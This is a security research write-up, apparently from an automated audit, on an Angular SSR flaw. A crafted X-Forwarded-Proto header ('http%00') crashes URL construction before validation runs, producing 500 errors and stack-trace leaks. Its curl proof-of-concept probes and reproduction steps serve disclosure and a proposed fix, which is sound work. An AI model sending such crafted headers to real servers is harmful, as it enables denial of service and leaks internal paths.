# Candidate 22 Walkthrough: `x-forwarded-proto` Reaches URL Construction Before Validation

## 1. Invariant Claimed

Angular claims `x-forwarded-proto` is constrained to `http` / `https` by validation at [packages/angular/ssr/src/utils/validation.ts:22]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/utils/validation.ts:22 ) and [packages/angular/ssr/src/utils/validation.ts:282]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/utils/validation.ts:282 ), so malformed protocol values should be rejected with a controlled 400.

## 2. Code-Level Gap

The Node adapter constructs `request.url` from `x-forwarded-proto` before Angular validation ever runs. `createRequestUrl()` reads the header and feeds it directly into `new URL()` at [packages/angular/ssr/node/src/request.ts:87]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/node/src/request.ts:87 ). `AngularNodeAppEngine.handle()` calls `createWebRequestFromNodeRequest()` first at [packages/angular/ssr/node/src/app-engine.ts:77]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/node/src/app-engine.ts:77 ), and only after that does `AngularAppEngine.handle()` run `validateRequest()` at [packages/angular/ssr/src/app-engine.ts:136]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/app-engine.ts:136 ). Invalid proto bytes can therefore throw from `new URL()` before the validator has a chance to return a 400.

## 3. Parser Quirk

The payload is not a raw NUL byte. It is the literal string `http%00`, which is valid as an HTTP header value and survives the parser unchanged. It becomes `http%00://example.com/home` inside `new URL(...)`, which throws `TypeError: Invalid URL`.

## 4. Realistic Consumer Pattern

The sink is the stock `ng new --ssr` Express wrapper:

- `/tmp/r3-main/src/server.ts:41` calls `angularApp.handle(req)`.
- `/tmp/r3-main/src/server.ts:47` forwards thrown errors to `next()`, which activates Express’s default error handler.

No custom middleware or contrived server plumbing is required.

## 5. Framework-Internal Consumer Check

This is an order-of-operations bug between the Node adapter and the framework validator:

1. Node request headers enter `createRequestUrl()` first.
2. `new URL()` throws on the malformed scheme.
3. The request never reaches `validateHeaders()` / `VALID_PROTO_REGEX`.

That is an authorization-consistency failure across handlers, not a missing regex.

## 6. Three-Probe Isolation

Baseline:

```bash
curl -si http://127.0.0.1:4300/home -H 'Host: example.com'
```

Observed:

```text
HTTP/1.1 200 OK
<main id="home">home-ok</main>
```

Exploit:

```bash
curl -si http://127.0.0.1:4300/home -H 'Host: example.com' -H 'X-Forwarded-Proto: http%00'
```

Observed with the canonical scaffold:

```text
HTTP/1.1 500 Internal Server Error
<pre>TypeError: Invalid URL
    at new URL ...
```

Production-env control:

```bash
curl -si http://127.0.0.1:4304/home -H 'Host: example.com' -H 'X-Forwarded-Proto: http%00'
```

Observed:

```text
HTTP/1.1 500 Internal Server Error
<pre>Internal Server Error</pre>
```

Validator control:

```bash
curl -si http://127.0.0.1:4300/home -H 'Host: example.com' -H 'X-Forwarded-Proto: httpx'
```

Observed:

```text
HTTP/1.1 400 Bad Request
Header "x-forwarded-proto" must be either "http" or "https".
```

## 7. How To Verify Yourself

1. Build the stock SSR app in `/tmp/r3-main` with `npm run build`.
2. Run `PORT=4300 node dist/xfh-comma-leak/server/server.mjs`.
3. Send the three `curl` probes above.
4. Repeat the exploit probe with `NODE_ENV=production PORT=4304` to confirm the same crash path still exists even when Express suppresses the stack body.

## 8. What The Bug Is Not

- Not a host-allowlist issue.
- Not CRLF injection.
- Not dependent on custom app code; the stock Express scaffold is enough.

## 9. Proposed Fix

Validate `x-forwarded-proto` before constructing `request.url`, or wrap `createWebRequestFromNodeRequest()` in a try/catch that converts URL-construction failures into the same controlled 400 path used by `validateRequest()`.

## 10. CVSS Justification

Suggested CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L` = 6.5.

Every attacker-controlled request can force a 500 instead of the intended 400. In default scaffold settings the client also receives a stack-trace page with internal file paths; in production mode the information leak is reduced, but the crash path remains reachable.
